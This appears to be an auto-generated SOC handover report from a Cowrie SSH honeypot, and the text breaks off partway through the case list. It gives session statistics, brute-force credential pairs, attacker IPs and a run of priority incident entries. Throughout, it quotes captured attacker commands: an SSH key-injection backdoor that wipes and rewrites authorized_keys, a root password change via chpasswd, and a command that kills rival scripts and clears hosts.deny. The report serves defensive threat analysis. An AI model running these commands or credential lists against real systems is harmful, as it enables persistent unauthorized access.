# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-29 |
| **Generated At** | 2026-04-29T17:43:03Z |
| **Shift Time** | 17:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **169** |
| Confirmed Threats | **140** |
| False Positives Filtered | **29** (17.2%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **15** |
| High Severity Cases | **44** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **125** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 3 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **129** |
| Unique Credential Pairs | **89** |
| Unique Usernames | **38** |
| Unique Passwords | **82** |
| Successful Auth Pairs | **27** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 44 |
| `345gs5662d34` | 21 |
| `ubuntu` | 13 |
| `user` | 4 |
| `test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 21 |
| `3245gs5662d34` | 21 |
| `123456` | 5 |
| `admin` | 3 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 21 |
| `root` | `3245gs5662d34` | 21 |
| `pi` | `raspberryraspberry993311` | 1 |
| `pi` | `raspberry` | 1 |
| `root` | `Asdf_123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Asdf_123` | `154.221.28.214` | 2026-04-29T14:13:39 |
| `root` | `3245gs5662d34` | `154.221.28.214` | 2026-04-29T14:13:43 |
| `root` | `azerty@123` | `154.221.28.214` | 2026-04-29T14:16:09 |
| `root` | `PASSW0RD` | `154.221.28.214` | 2026-04-29T14:17:49 |
| `root` | `armagedon` | `154.221.28.214` | 2026-04-29T14:18:57 |
| `root` | `Qwerty123!@#` | `154.221.28.214` | 2026-04-29T14:22:27 |
| `root` | `iamroot` | `154.221.28.214` | 2026-04-29T14:23:35 |
| `root` | `123456ABc` | `154.221.28.214` | 2026-04-29T14:26:57 |
| `root` | `zaq123edcx` | `154.221.28.214` | 2026-04-29T14:28:06 |
| `root` | `123456asd` | `154.221.28.214` | 2026-04-29T14:29:19 |
| `root` | `Star@2024` | `154.221.28.214` | 2026-04-29T14:30:31 |
| `root` | `1987abcd` | `154.221.28.214` | 2026-04-29T14:31:47 |
| `root` | `#edc4rfv` | `154.221.28.214` | 2026-04-29T14:32:58 |
| `root` | `9ijn(IJN` | `154.221.28.214` | 2026-04-29T14:34:06 |
| `root` | `null` | `185.239.239.67` | 2026-04-29T14:36:08 |
| `root` | `3245gs5662d34` | `185.239.239.67` | 2026-04-29T14:36:12 |
| `root` | `CJ@123456` | `154.221.28.214` | 2026-04-29T14:39:45 |
| `root` | `oracle7` | `154.209.4.208` | 2026-04-29T16:23:59 |
| `root` | `3245gs5662d34` | `154.209.4.208` | 2026-04-29T16:24:03 |
| `root` | `admin@123$%^` | `154.209.4.208` | 2026-04-29T16:31:10 |
| `root` | `user123$%^` | `154.209.4.208` | 2026-04-29T16:32:04 |
| `root` | `admin3344` | `154.209.4.208` | 2026-04-29T16:33:59 |
| `root` | `server00` | `165.154.5.249` | 2026-04-29T16:49:04 |
| `root` | `3245gs5662d34` | `165.154.5.249` | 2026-04-29T16:49:07 |
| `root` | `test#123` | `165.154.5.249` | 2026-04-29T17:01:49 |
| `root` | `test-123` | `165.154.5.249` | 2026-04-29T17:02:43 |
| `root` | `------fuck------` | `163.177.76.85` | 2026-04-29T17:27:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **169** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 131 |
| OpenSSH | 2 |
| Go SSH scanner | 2 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 128 | 4 |
| `ec7378c1a92f...` | Generic scanner | 2 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 128 | 4 | libssh-based |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `ec7378c1a92f...` | OpenSSH | 2 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 21 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:B5S88n0O44RS"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `154.221.28.214`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `154.221.28.214`, `185.239.239.67`, `165.154.5.249`, `154.209.4.208`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **24** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 2 | HIGH |
| `AS142403` | YISU CLOUD LTD | 2 | HIGH |
| `AS135061` | China Unicom Guangdong IP network | 1 | HIGH |
| `AS4780` | Digital United Inc. | 1 | HIGH |
| `AS35047` | Abissnet sh.a. | 1 | MEDIUM |
| `AS34984` | Superonline Iletisim Hizmetleri A.S. | 1 | LOW |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (44)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a80e1ea3e3f3

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:13 |
| **Last Seen** | 2026-04-29 14:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:13:39` | `cowrie.session.connect` |
| `2026-04-29 14:13:39` | `cowrie.client.version` |
| `2026-04-29 14:13:39` | `cowrie.client.kex` |
| `2026-04-29 14:13:39` | `cowrie.login.success` |
| `2026-04-29 14:13:39` | `cowrie.session.params` |
| `2026-04-29 14:13:39` | `cowrie.command.input` |
| `2026-04-29 14:13:39` | `cowrie.command.failed` |
| `2026-04-29 14:13:40` | `cowrie.log.closed` |
| `2026-04-29 14:13:40` | `cowrie.session.params` |
| `2026-04-29 14:13:40` | `cowrie.command.input` |
| `2026-04-29 14:13:40` | `cowrie.session.file_download` |
| `2026-04-29 14:13:40` | `cowrie.log.closed` |
| `2026-04-29 14:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7dde08780b5

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:13 |
| **Last Seen** | 2026-04-29 14:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:13:42` | `cowrie.session.connect` |
| `2026-04-29 14:13:42` | `cowrie.client.version` |
| `2026-04-29 14:13:43` | `cowrie.client.kex` |
| `2026-04-29 14:13:43` | `cowrie.login.success` |
| `2026-04-29 14:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ad87d35b1f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:16 |
| **Last Seen** | 2026-04-29 14:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:16:09` | `cowrie.session.connect` |
| `2026-04-29 14:16:09` | `cowrie.client.version` |
| `2026-04-29 14:16:09` | `cowrie.client.kex` |
| `2026-04-29 14:16:09` | `cowrie.login.success` |
| `2026-04-29 14:16:09` | `cowrie.session.params` |
| `2026-04-29 14:16:09` | `cowrie.command.input` |
| `2026-04-29 14:16:09` | `cowrie.command.failed` |
| `2026-04-29 14:16:10` | `cowrie.log.closed` |
| `2026-04-29 14:16:10` | `cowrie.session.params` |
| `2026-04-29 14:16:10` | `cowrie.command.input` |
| `2026-04-29 14:16:10` | `cowrie.session.file_download` |
| `2026-04-29 14:16:10` | `cowrie.log.closed` |
| `2026-04-29 14:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237198670c8d

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:16 |
| **Last Seen** | 2026-04-29 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:16:12` | `cowrie.session.connect` |
| `2026-04-29 14:16:12` | `cowrie.client.version` |
| `2026-04-29 14:16:12` | `cowrie.client.kex` |
| `2026-04-29 14:16:13` | `cowrie.login.success` |
| `2026-04-29 14:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb28a8482f1b

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:17 |
| **Last Seen** | 2026-04-29 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:17:48` | `cowrie.session.connect` |
| `2026-04-29 14:17:48` | `cowrie.client.version` |
| `2026-04-29 14:17:49` | `cowrie.client.kex` |
| `2026-04-29 14:17:49` | `cowrie.login.success` |
| `2026-04-29 14:17:49` | `cowrie.session.params` |
| `2026-04-29 14:17:49` | `cowrie.command.input` |
| `2026-04-29 14:17:49` | `cowrie.command.failed` |
| `2026-04-29 14:17:49` | `cowrie.log.closed` |
| `2026-04-29 14:17:50` | `cowrie.session.params` |
| `2026-04-29 14:17:50` | `cowrie.command.input` |
| `2026-04-29 14:17:50` | `cowrie.session.file_download` |
| `2026-04-29 14:17:50` | `cowrie.log.closed` |
| `2026-04-29 14:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7537acf5db15

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:17 |
| **Last Seen** | 2026-04-29 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:17:52` | `cowrie.session.connect` |
| `2026-04-29 14:17:52` | `cowrie.client.version` |
| `2026-04-29 14:17:52` | `cowrie.client.kex` |
| `2026-04-29 14:17:52` | `cowrie.login.success` |
| `2026-04-29 14:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd5bf3e56d0

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:18 |
| **Last Seen** | 2026-04-29 14:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:18:56` | `cowrie.session.connect` |
| `2026-04-29 14:18:56` | `cowrie.client.version` |
| `2026-04-29 14:18:56` | `cowrie.client.kex` |
| `2026-04-29 14:18:57` | `cowrie.login.success` |
| `2026-04-29 14:18:57` | `cowrie.session.params` |
| `2026-04-29 14:18:57` | `cowrie.command.input` |
| `2026-04-29 14:18:57` | `cowrie.command.failed` |
| `2026-04-29 14:18:57` | `cowrie.log.closed` |
| `2026-04-29 14:18:57` | `cowrie.session.params` |
| `2026-04-29 14:18:57` | `cowrie.command.input` |
| `2026-04-29 14:18:57` | `cowrie.session.file_download` |
| `2026-04-29 14:18:57` | `cowrie.log.closed` |
| `2026-04-29 14:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583c07bfcce7

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:19 |
| **Last Seen** | 2026-04-29 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:19:01` | `cowrie.session.connect` |
| `2026-04-29 14:19:01` | `cowrie.client.version` |
| `2026-04-29 14:19:01` | `cowrie.client.kex` |
| `2026-04-29 14:19:01` | `cowrie.login.success` |
| `2026-04-29 14:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af15dd4ebaac

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:22 |
| **Last Seen** | 2026-04-29 14:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:22:27` | `cowrie.session.connect` |
| `2026-04-29 14:22:27` | `cowrie.client.version` |
| `2026-04-29 14:22:27` | `cowrie.client.kex` |
| `2026-04-29 14:22:27` | `cowrie.login.success` |
| `2026-04-29 14:22:28` | `cowrie.session.params` |
| `2026-04-29 14:22:28` | `cowrie.command.input` |
| `2026-04-29 14:22:28` | `cowrie.command.failed` |
| `2026-04-29 14:22:28` | `cowrie.log.closed` |
| `2026-04-29 14:22:28` | `cowrie.session.params` |
| `2026-04-29 14:22:28` | `cowrie.command.input` |
| `2026-04-29 14:22:28` | `cowrie.session.file_download` |
| `2026-04-29 14:22:28` | `cowrie.log.closed` |
| `2026-04-29 14:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea16c377611

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:22 |
| **Last Seen** | 2026-04-29 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:22:30` | `cowrie.session.connect` |
| `2026-04-29 14:22:30` | `cowrie.client.version` |
| `2026-04-29 14:22:30` | `cowrie.client.kex` |
| `2026-04-29 14:22:31` | `cowrie.login.success` |
| `2026-04-29 14:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-532eafbde3d3

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:23 |
| **Last Seen** | 2026-04-29 14:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:23:35` | `cowrie.session.connect` |
| `2026-04-29 14:23:35` | `cowrie.client.version` |
| `2026-04-29 14:23:35` | `cowrie.client.kex` |
| `2026-04-29 14:23:35` | `cowrie.login.success` |
| `2026-04-29 14:23:35` | `cowrie.session.params` |
| `2026-04-29 14:23:35` | `cowrie.command.input` |
| `2026-04-29 14:23:35` | `cowrie.command.failed` |
| `2026-04-29 14:23:36` | `cowrie.log.closed` |
| `2026-04-29 14:23:36` | `cowrie.session.params` |
| `2026-04-29 14:23:36` | `cowrie.command.input` |
| `2026-04-29 14:23:36` | `cowrie.session.file_download` |
| `2026-04-29 14:23:36` | `cowrie.log.closed` |
| `2026-04-29 14:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320a6cadb93b

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:23 |
| **Last Seen** | 2026-04-29 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:23:38` | `cowrie.session.connect` |
| `2026-04-29 14:23:38` | `cowrie.client.version` |
